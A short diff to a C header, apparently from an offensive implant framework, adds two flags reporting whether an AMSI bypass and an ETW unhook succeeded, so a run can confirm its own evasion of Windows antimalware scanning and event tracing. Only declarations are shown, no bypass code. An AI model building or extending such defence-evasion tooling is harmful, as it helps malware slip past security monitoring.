@@ -129,6 +129,14 @@ px_size_t px_strcat(char *dst, const char *src, px_size_t cap);
 const char *px_strstr_ci(const char *hay, const char *needle);
 
 /* --- the capability library ------------------------------------------ */
+/* Whether the AMSI bypass and the ETW unhook actually took.
+ *
+ * The capability library reports them, so a run can say whether its
+ * own evasion worked rather than assuming it.
+ */
+extern int px_amsi_patched;
+extern int px_etw_patched;
+
 /* Run a capability by name. Returns 1 if the name was known. */
 #if PX_CAPABILITIES
 int px_cap_run(const char *name, const char *args, char *report,
